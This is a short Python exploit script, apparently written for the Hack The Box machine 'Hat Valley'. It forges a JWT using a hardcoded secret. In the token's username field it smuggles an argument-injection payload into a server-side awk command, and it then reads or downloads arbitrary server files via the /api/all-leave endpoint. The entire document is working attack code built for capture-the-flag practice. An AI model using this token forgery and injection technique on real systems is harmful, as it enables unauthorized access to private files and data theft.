#!/usr/bin/python
import jwt
import requests
import sys
# Usage: token-read.py filename #read
# Usage: token-read.py filanem -d #download
 
secret = "123beany123"
userdata = {"username": f"/' {sys.argv[1]} '/nada"}
token = jwt.encode(userdata, secret)

#print(f"awk '/" + f"/' {sys.argv[1]} '/" + "/' /var/www/private/leave_requests.csv")
# this is the command we are injecting into

cookies= {'token' : token}
r = requests.get('http://hat-valley.htb/api/all-leave', cookies=cookies)

# check if we want to download, else just print file to stdout
try:
	if sys.argv[2] == "-d":
		with open(sys.argv[1].split("/")[-1], "wb") as f:
			f.write(r.content)
except:
	print(r.text)
